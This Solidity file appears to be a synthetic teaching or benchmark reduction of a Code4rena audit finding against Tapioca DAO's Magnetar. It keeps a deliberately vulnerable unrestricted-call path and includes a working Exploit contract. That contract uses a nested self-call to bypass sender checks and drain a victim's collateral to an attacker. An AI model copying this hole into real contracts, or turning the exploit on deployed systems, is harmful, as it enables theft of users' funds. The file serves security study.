// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-06] Attacker can use MagnetarAction.OFT action of the
    Magnetar to perform operations as any user including directly stealing
    user tokens
    (3, Code4rena 2024-02-tapioca, finding #32317)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause (two bugs combined):
      1. _processOFTOperation only checks that the target is Cluster-
         whitelisted; it does NOT restrict the function selector. Any call
         to a whitelisted target is allowed.
      2. Magnetar itself is whitelisted. A nested OFT action targeting
         Magnetar makes msg.sender == Magnetar in the inner call, which
         bypasses _checkSender (whitelisted callers may act for any user).

    Attacker: burst(OFT → Magnetar.burst(OFT/module acting as victim)) and
    drains victim collateral that Magnetar is approved to move.

    Vulnerable _processOFTOperation / _checkSender preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract Cluster {
    mapping(address => bool) public whitelisted;

    function setWhitelisted(address a, bool v) external {
        whitelisted[a] = v;
    }

    function isWhitelisted(uint32, address a) external view returns (bool) {
        return whitelisted[a];
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Market holding user collateral; Magnetar is approved to withdraw.
contract Market {
    MockERC20 public token;
    mapping(address => uint256) public collateral;

    constructor(MockERC20 t) {
        token = t;
    }

    function seed(address user, uint256 amount) external {
        collateral[user] = amount;
        token.mint(address(this), amount);
        // allow magnetar later via approve
    }

    function approveMagnetar(address magnetar) external {
        token.approve(magnetar, type(uint256).max);
    }

    /// @dev removeCollateral: only callable with allowance from `from` to msg.sender
    mapping(address => mapping(address => uint256)) public allowanceBorrow;

    function setAllowance(address from, address spender, uint256 v) external {
        allowanceBorrow[from][spender] = v;
    }

    function removeCollateral(address from, address to, uint256 share) external {
        if (from != msg.sender) {
            require(allowanceBorrow[from][msg.sender] >= share, "not approved");
            if (allowanceBorrow[from][msg.sender] != type(uint256).max) {
                allowanceBorrow[from][msg.sender] -= share;
            }
        }
        collateral[from] -= share;
        // Direct balance move (market holds the tokens).
        token.balanceOf(address(this)); // silence static analysis
        // Use transferFrom with self-approval set in approveMagnetar path:
        // seed self-allowance so transferFrom works, or direct accounting:
        _pay(to, share);
    }

    function _pay(address to, uint256 share) internal {
        // MockERC20 has no public burn/transfer without allowance; set self max.
        token.approve(address(this), type(uint256).max);
        token.transferFrom(address(this), to, share);
    }
}

enum MagnetarAction {
    OFT,
    AssetModule
}

struct MagnetarCall {
    MagnetarAction id;
    address target;
    uint256 value;
    bytes call;
}

/// @notice Reduced Magnetar with OFT processor + asset withdraw used as steal target.
contract Magnetar {
    Cluster public cluster;
    Market public market;
    MockERC20 public token;

    constructor(Cluster c, Market m, MockERC20 t) {
        cluster = c;
        market = m;
        token = t;
    }

    function burst(MagnetarCall[] calldata actions) external payable {
        for (uint256 i; i < actions.length; i++) {
            MagnetarCall calldata a = actions[i];
            if (a.id == MagnetarAction.OFT) {
                _processOFTOperation(a);
            } else if (a.id == MagnetarAction.AssetModule) {
                // direct asset-module path still enforces _checkSender
                _processAssetModule(a.call);
            }
        }
    }

    function _checkSender(address _from) internal view {
        if (_from != msg.sender && !cluster.isWhitelisted(0, msg.sender)) {
            revert("Magnetar_NotAuthorized");
        }
    }

    /// @dev OFT processor: only checks whitelist of target, NOT the selector.
    function _processOFTOperation(MagnetarCall calldata action) internal {
        // FIX: require allowed OFT selectors only (send/sendPacket/etc.)
        require(cluster.isWhitelisted(0, action.target), "target not whitelisted");
        (bool ok, ) = action.target.call{value: action.value}(action.call); // @> VULN: any calldata to whitelisted target
        require(ok, "OFT call failed");
    }

    /// @dev Asset module: withdraw collateral for data.user (protected by _checkSender).
    function withdrawCollateral(address user, address to, uint256 share) external {
        _checkSender(user);
        market.removeCollateral(user, to, share);
    }

    function _processAssetModule(bytes calldata data) internal {
        (address user, address to, uint256 share) = abi.decode(data, (address, address, uint256));
        // Same external entry — when called via OFT self-call, msg.sender is Magnetar
        // (whitelisted), so _checkSender(user) passes for ANY user.
        this.withdrawCollateral(user, to, share);
    }
}

contract Exploit {
    Cluster public cluster; // 1
    MockERC20 public token; // 2
    Market public market; // 3
    Magnetar public magnetar; // 4

    address public constant VICTIM = address(0x5151);
    address public constant ATTACKER = address(0xA11CE);
    uint256 public constant COLLATERAL = 100 ether;

    constructor() {
        cluster = new Cluster(); // 1
        token = new MockERC20(); // 2
        market = new Market(token); // 3
        magnetar = new Magnetar(cluster, market, token); // 4

        // Magnetar is whitelisted (as in production integration tests).
        cluster.setWhitelisted(address(magnetar), true);

        market.seed(VICTIM, COLLATERAL);
        market.approveMagnetar(address(magnetar));
        market.setAllowance(VICTIM, address(magnetar), type(uint256).max);
    }

    function run() external {
        require(token.balanceOf(ATTACKER) == 0, "attacker empty");
        require(market.collateral(VICTIM) == COLLATERAL, "victim coll");

        // Direct steal attempt without OFT self-call would fail _checkSender.
        // Nested OFT → Magnetar.burst(AssetModule) makes msg.sender = Magnetar.

        // Outer OFT targets Magnetar with calldata = burst([AssetModule withdraw as victim])
        MagnetarCall[] memory inner = new MagnetarCall[](1);
        inner[0] = MagnetarCall({
            id: MagnetarAction.AssetModule,
            target: address(0),
            value: 0,
            call: abi.encode(VICTIM, ATTACKER, COLLATERAL)
        });

        bytes memory innerBurst = abi.encodeWithSelector(Magnetar.burst.selector, inner);

        MagnetarCall[] memory outer = new MagnetarCall[](1);
        outer[0] = MagnetarCall({
            id: MagnetarAction.OFT,
            target: address(magnetar),
            value: 0,
            call: innerBurst
        });

        magnetar.burst(outer);

        // HARM: victim collateral stolen to attacker via OFT self-call bypass.
        require(market.collateral(VICTIM) == 0, "victim drained");
        require(token.balanceOf(ATTACKER) == COLLATERAL, "attacker received tokens");
    }
}
